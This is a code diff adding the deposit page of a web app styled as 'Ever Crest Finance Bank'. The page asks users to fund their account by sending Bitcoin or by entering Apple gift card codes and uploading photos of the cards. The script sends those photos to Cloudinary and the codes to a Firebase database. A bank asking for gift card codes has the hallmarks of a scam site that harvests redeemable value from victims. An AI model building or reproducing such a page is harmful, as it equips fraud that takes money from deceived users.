@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>Deposit | Ever Crest Finance Bank</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            box-sizing: border-box;
+            padding-top: env(safe-area-inset-top, 0px);
+            padding-bottom: env(safe-area-inset-bottom, 0px);
+            --bg: #f5f7fb;
+            --surface: #fff;
+            --ink: #0b2340;
+            --soft: #5b6f86;
+            --line: #d5dee8;
+            --gold: #ffc93c;
+            --ok: #12a06b;
+            --bad: #d64535;
+            --shadow: 0 20px 50px -30px rgba(11, 35, 64, .35)
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: inherit
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            scroll-padding-top: env(safe-area-inset-top, 0px)
+        }
+
+        body {
+            margin: 0;
+            min-height: 100%;
+            background: var(--bg);
+            color: var(--ink);
+            font: 15px/1.5 "Plus Jakarta Sans", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif
+        }
+
+        [hidden] {
+            display: none !important
+        }
+
+        .top {
+            position: sticky;
+            top: env(safe-area-inset-top, 0px);
+            z-index: 20;
+            background: rgba(255, 255, 255, .94);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-bottom: 1px solid var(--line)
+        }
+
+        .top .in {
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 10px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px
+        }
+
+        .brand {
+            font-weight: 800;
+            letter-spacing: -.01em
+        }
+
+        .brand i {
+            font-style: normal;
+            color: #e0a800
+        }
+
+        .av {
+            text-decoration: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--ink);
+            color: var(--gold);
+            display: grid;
+            place-items: center;
+            font-weight: 800;
+            font-size: .82rem
+        }
+
+        main {
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 24px 18px 48px
+        }
+
+        .back {
+            display: inline-block;
+            margin-bottom: 14px;
+            color: var(--ink);
+            font-weight: 700;
+            font-size: .85rem;
+            text-decoration: underline
+        }
+
+        h1 {
+            font-size: clamp(1.5rem, 5vw, 2rem);
+            margin: 0 0 2px;
+            letter-spacing: -.02em;
+            font-weight: 800
+        }
+
+        .sub {
+            color: var(--soft);
+            margin: 0 0 18px;
+            font-size: .9rem
+        }
+
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--line);
+            border-radius: 16px;
+            padding: 20px 18px;
+            box-shadow: var(--shadow);
+            margin-bottom: 18px
+        }
+
+        .card h2 {
+            margin: 0 0 6px;
+            font-size: 1.15rem;
+            font-weight: 800
+        }
+
+        .card p {
+            margin: 0 0 16px;
+            color: var(--soft)
+        }
+
+        label,
+        legend {
+            display: block;
+            font-weight: 700;
+            font-size: .85rem;
+            margin: 14px 0 6px;
+            padding: 0
+        }
+
+        fieldset {
+            border: 0;
+            margin: 0;
+            padding: 0
+        }
+
+        input[type=text],
+        input[type=number],
+        select {
+            width: 100%;
+            font: inherit;
+            color: var(--ink);
+            background: #fff;
+            border: 1.5px solid var(--line);
+            border-radius: 12px;
+            padding: 12px 14px;
+            min-height: 46px
+        }
+
+        input:focus-visible,
+        select:focus-visible,
+        button:focus-visible,
+        .choice:has(input:focus-visible) {
+            outline: 3px solid rgba(255, 201, 60, .7);
+            outline-offset: 2px;
+            border-color: var(--ink)
+        }
+
+        .choice {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            background: var(--surface);
+            border: 1.5px solid var(--line);
+            border-radius: 16px;
+            padding: 16px;
+            margin: 0 0 12px;
+            cursor: pointer;
+            box-shadow: var(--shadow)
+        }
+
+        .choice:has(input:checked) {
+            border-color: var(--ink);
+            background: #fffbea
+        }
+
+        .choice input {
+            accent-color: var(--ink);
+            margin-top: 5px
+        }
+
+        .choice b {
+            display: block;
+            font-size: 1rem;
+            font-weight: 800
+        }
+
+        .choice small {
+            display: block;
+            color: var(--soft);
+            font-size: .85rem;
+            font-weight: 500;
+            margin-top: 2px
+        }
+
+        .row {
+            display: flex;
+            gap: 8px
+        }
+
+        .row input {
+            flex: 1;
+            min-width: 0
+        }
+
+        .btn {
+            font: inherit;
+            font-weight: 700;
+            font-size: .9rem;
+            border-radius: 12px;
+            padding: 12px 18px;
+            min-height: 46px;
+            cursor: pointer;
+            border: 1.5px solid var(--ink);
+            background: #fff;
+            color: var(--ink)
+        }
+
+        .btn:hover {
+            background: #eef2f8
+        }
+
+        .btn.primary {
+            background: var(--ink);
+            color: var(--gold)
+        }
+
+        .btn.primary:hover {
+            filter: brightness(1.2)
+        }
+
+        .btn.wide {
+            width: 100%;
+            margin-top: 6px
+        }
+
+        .warn {
+            background: var(--gold);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin: 0 0 16px;
+            font-weight: 600;
+            font-size: .88rem;
+            color: var(--ink)
+        }
+
+        .gift-card-section {
+            border: 1.5px solid var(--line);
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 12px;
+            background: #fff
+        }
+
+        .uplabel {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin: 14px 0 8px;
+            font-weight: 700;
+            font-size: .85rem
+        }
+
+        .upbox {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            padding: 0;
+            display: grid;
+            place-items: center;
+            overflow: hidden;
+            cursor: pointer;
+            background: #f3fbf7;
+            border: 1.5px dashed rgba(18, 160, 107, .5);
+            border-radius: 14px
+        }
+
+        .upbox:hover {
+            background: #e8f7ef
+        }
+
+        .upbox .ico {
+            width: 40px;
+            height: 40px
+        }
+
+        .upbox .prev {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover
+        }
+
+        .fn {
+            margin: 6px 0 0;
+            font-size: .8rem;
+            color: var(--soft);
+            word-break: break-all
+        }
+
+        .snack {
+            position: fixed;
+            top: calc(env(safe-area-inset-top, 0px) + 12px);
+            left: 50%;
+            z-index: 99;
+            width: min(92vw, 460px);
+            padding: 13px 16px;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: .9rem;
+            background: var(--ink);
+            box-shadow: 0 14px 34px -12px rgba(11, 35, 64, .6);
+            transform: translate(-50%, -160%);
+            opacity: 0;
+            transition: transform .35s cubic-bezier(.2, .8, .2, 1), opacity .3s;
+            pointer-events: none
+        }
+
+        .snack.show {
+            transform: translate(-50%, 0);
+            opacity: 1
+        }
+
+        .snack.success {
+            background: var(--ok)
+        }
+
+        .snack.error {
+            background: var(--bad)
+        }
+
+        .sr {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            clip: rect(0 0 0 0)
+        }
+
+        @media (max-width: 480px) {
+            main {
+                padding: 18px 14px 40px
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                transition: none !important;
+                animation: none !important
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="snack" id="snack" role="status" aria-live="polite"></div>
+
+    <header class="top">
+        <div class="in">
+            <div class="brand"><i>Ever</i> Crest Finance Bank</div>
+            <a class="av" id="avatar" href="profile.html" aria-label="Your profile" title="Your profile">EC</a>
+        </div>
+    </header>
+
+    <main>
+        <a class="back" id="backLink" href="dashboard.html">&larr; Back to dashboard</a>
+        <h1>+ Deposit</h1>
+
+        <section id="choose">
+            <p class="sub">Choose how you want to fund your account.</p>
+            <fieldset>
+                <legend class="sr">Deposit option</legend>
+                <label class="choice"><input type="radio" name="opt" value="btc">
+                    <span><b>Bitcoin (BTC)</b><small>Send BTC to the Ever Crest wallet address, then refresh your
+                            account.</small></span></label>
+                <label class="choice"><input type="radio" name="opt" value="gift">
+                    <span><b>Gift card</b><small>Pay with an Apple gift card. Upload a picture and enter the card
+                            number.</small></span></label>
+            </fieldset>
+            <button class="btn primary wide" type="button" id="proceed">Proceed</button>
+        </section>
+
+        <section class="card" id="p1" hidden aria-labelledby="o1">
+            <h2 id="o1">Bitcoin (BTC)</h2>
+            <div class="warn">Send only <b>BTC</b> to this address and only through the BTC network. Sending any other
+                asset or using another network will result in a permanent loss of that asset.</div>
+            <p>Wallet address</p>
+            <label for="wallet" class="sr">Wallet address</label>
+            <div class="row">
+                <input type="text" id="wallet" placeholder="Wallet address will be available after account approval."
+                    readonly>
+                <button class="btn" type="button" id="copyBtn">Copy</button>
+            </div>
+        </section>
+
+        <form class="card" id="p2" hidden novalidate aria-labelledby="o2">
+            <h2 id="o2">Gift card</h2>
+            <p>Pay with Gift Card</p>
+
+            <label for="giftType">Slot</label>
+            <select id="giftType">
+                <option>Apple/iTunes</option>
+            </select>
+
+            <label for="qty">Amount</label>
+            <select id="qty">
+                <option value="">Select amount</option>
+                <option value="1000">$1000</option>
+                <option value="500">$500</option>
+                <option value="200">$200</option>
+            </select>
+
+            <div class="gift-card-section">
+                <label for="cardNumber">Card Code</label>
+                <input type="text" id="cardNumber" placeholder="Enter card number" autocomplete="off">
+
+                <div class="uplabel">Upload Picture</div>
+                <button type="button" class="upbox" id="uploadBtn" aria-label="Upload card picture">
+                    <svg class="ico" viewBox="0 0 48 48" fill="none" stroke="#0b2340" stroke-width="2.4"
+                        stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <path d="M6 16a3 3 0 0 1 3-3h4l2.5-4h9L27 13h4a3 3 0 0 1 3 3v6" />
+                        <path d="M6 16v17a3 3 0 0 0 3 3h14" />
+                        <circle cx="21" cy="23" r="5.5" />
+                        <path d="M36 30v12M30 36h12" stroke="#12a06b" stroke-width="3" />
+                    </svg>
+                    <img class="prev" id="imgPreview" alt="Selected card picture" hidden>
+                </button>
+                <input type="file" id="fileInput" class="sr" accept="image/*">
+                <p class="fn" id="fileName"></p>
+            </div>
+
+            <button class="btn primary wide" type="submit" id="submitBtn" style="margin-top:16px">SUBMIT</button>
+        </form>
+    </main>
+
+    <script type="module">
+        /* ============================================================
+           FIREBASE (same config as your dashboard)
+           ============================================================ */
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+        import { getAuth } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBH0n84QTvGBWaSlJdO6AoUU6IRuJETHLA",
+            authDomain: "ever-crest-finance-bank.firebaseapp.com",
+            projectId: "ever-crest-finance-bank",
+            storageBucket: "ever-crest-finance-bank.firebasestorage.app",
+            messagingSenderId: "469287844559",
+            appId: "1:469287844559:web:4f219675a1055533be95ba"
+            // databaseURL: "https://ever-crest-finance-bank-default-rtdb.firebaseio.com"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getDatabase(app);
+
+        /* ============================================================
+           CLOUDINARY CONFIG  
+           ============================================================ */
+        const CLOUD_NAME = "dkvuwnrxv";
+        const UPLOAD_PRESET = "photos";
+
+        /* ============================================================
+           UI HELPERS
+           ============================================================ */
+        const $ = i => document.getElementById(i);
+        let timer;
+        function toast(msg, type = 'info', ms = 4000) {
+            const s = $('snack');
+            s.textContent = msg;
+            s.className = 'snack ' + type;
+            void s.offsetWidth;
+            s.classList.add('show');
+            clearTimeout(timer);
+            timer = setTimeout(() => s.classList.remove('show'), ms);
+        }
+
+        /* ============================================================
+           WAIT FOR AUTH AND GRAB THE UID
+           ============================================================ */
+        let uid = null;
+        async function requireUser() {
+            await auth.authStateReady();
+            const user = auth.currentUser;
+            if (!user) {
+                location.replace('login.html');
+                throw new Error('Not signed in');
+            }
+            uid = user.uid;
+            return uid;
+        }
+
+        /* ============================================================
+           STEP 1 TO STEP 2 NAVIGATION
+           ============================================================ */
+        let current = null;
+        function showOption(o) {
+            current = o;
+            $('choose').hidden = !!o;
+            $('p1').hidden = o !== 'btc';
+            $('p2').hidden = o !== 'gift';
+            $('backLink').textContent = o ? '\u2190 Change option' : '\u2190 Back to dashboard';
+            $('backLink').setAttribute('href', o ? '#' : 'dashboard.html');
+            window.scrollTo(0, 0);
+        }
+        $('proceed').addEventListener('click', () => {
+            const c = document.querySelector('input[name=opt]:checked');
+            if (!c) return toast('Choose a deposit option to continue.', 'error');
+            showOption(c.value);
+        });
+        $('backLink').addEventListener('click', e => {
+            if (current) {
+                e.preventDefault();
+                showOption(null);
+            }
+        });
+
+        /* ============================================================
+           BITCOIN OPTION
+           ============================================================ */
+        $('wallet').value = null;
+        $('copyBtn').addEventListener('click', async () => {
+            const v = $('wallet').value;
+            if (!v) {
+                toast('Wallet address is not available yet.', 'error');
+                return;
+            }
+            try {
+                await navigator.clipboard.writeText(v);
+            } catch (_) {
+                $('wallet').select();
+                document.execCommand('copy');
+            }
+            toast('Wallet address copied.', 'success', 2500);
+        });
+
+        /* ============================================================
+           GIFT CARD UPLOAD PREVIEW
+           ============================================================ */
+        const uploadBtn = $('uploadBtn');
+        const fileInput = $('fileInput');
+        const imgPreview = $('imgPreview');
+        const fileNameDisplay = $('fileName');
+
+        uploadBtn.addEventListener('click', () => fileInput.click());
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const url = URL.createObjectURL(file);
+                imgPreview.src = url;
+                imgPreview.hidden = false;
+                fileNameDisplay.textContent = null;
+                uploadBtn.querySelector('.ico').style.display = 'none';
+            }
+        });
+
+        /* ============================================================
+           CLOUDINARY IMAGE UPLOAD
+           ============================================================ */
+        async function uploadImageToCloudinary(file) {
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("upload_preset", UPLOAD_PRESET);
+
+            const res = await fetch(
+                "https://api.cloudinary.com/v1_1/" + CLOUD_NAME + "/image/upload",
+                { method: "POST", body: formData }
+            );
+            if (!res.ok) {
+                const errText = await res.text();
+                throw new Error("Cloudinary upload failed: " + errText);
+            }
+            const data = await res.json();
+            return data.secure_url;
+        }
+
+        /* ============================================================
+           GIFT CARD SUBMIT
+           Reads: slot, amount, card code, file, uid
+           Uploads image to Cloudinary
+           Saves to Realtime Database at deposits/{uid}/{pushId}
+           ============================================================ */
+        $('p2').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            if (!uid) {
+                try { await requireUser(); }
+                catch (_) { return; }
+            }
+
+            const slot = $('giftType').value;
+            const amount = $('qty').value;
+            const cardNumber = $('cardNumber').value.trim();
+            const file = fileInput.files[0];
+
+            if (!amount) return toast('Please select an amount.', 'error');
+            if (!cardNumber) return toast('Please enter the gift card number.', 'error');
+            if (!file) return toast('Please upload a picture of the gift card.', 'error');
+
+            const submitBtn = $('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            try {
+                /* 1. Upload image to Cloudinary */
+                const imageUrl = await uploadImageToCloudinary(file);
+
+                /* 2. Save to Realtime Database under this user's UID */
+                const newRef = push(ref(db, 'deposits/' + uid));
+                await set(newRef, {
+                    uid: uid,
+                    method: 'gift_card',
+                    slot: slot,
+                    amount: Number(amount),
+                    amountLabel: '$' + amount,
+                    cardNumber: cardNumber,
+                    imageUrl: imageUrl,
+                    createdAt: Date.now()
+                });
+
+                toast('Data submitted successfully!', 'success', 5000);
+
+                /* 3. Reset form */
+                e.target.reset();
+                imgPreview.hidden = true;
+                imgPreview.removeAttribute('src');
+                fileNameDisplay.textContent = '';
+                uploadBtn.querySelector('.ico').style.display = '';
+
+            } catch (err) {
+                console.error('Submission error:', err);
+                toast('Submission failed: ' + err.message, 'error', 6000);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'SUBMIT';
+            }
+        });
+
+        /* Kick off auth check as soon as the page loads */
+        requireUser().catch(() => { });
+    </script>
+</body>
+
+</html>
